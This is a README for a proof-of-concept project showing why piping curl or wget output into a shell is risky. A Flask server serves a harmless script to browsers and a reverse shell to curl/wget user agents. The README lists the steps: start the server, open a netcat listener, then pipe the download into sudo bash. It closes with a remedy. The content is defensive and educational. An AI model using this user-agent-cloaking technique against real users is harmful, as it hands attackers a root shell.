# piping-to-shell-PoC
Proof of Concept why piping from curl/wget to shell is asking for trouble. Flask is used as the web server and check if the user agent contains "Wget" or "curl". By default none of them mask the user-agent field. If the user agent is not wget/curl a dummy script is shown. Else, if bash is run as root a reverse shell will spawn.

## Demonstration
* First of all, setup the server.
	* `python3 server.py`
* Open a browser and access `/script.sh`. The dummy script should appear.
	* ![Browser](./images/browser_output.png)
* Open a new terminal and setup a listener for the reverse shell.
	* `nc -nvlp 5555`
* In a new terminal use wget or curl to download the file and pipe it to bash.
	* `wget -O- localhost:5000/script.sh | sudo bash`
	OR
	* `curl localhost:5000/script.sh | sudo bash `


## Remedy

Don't pipe into shell (especially using sudo) or at least curl/wget the file before executing it :). 
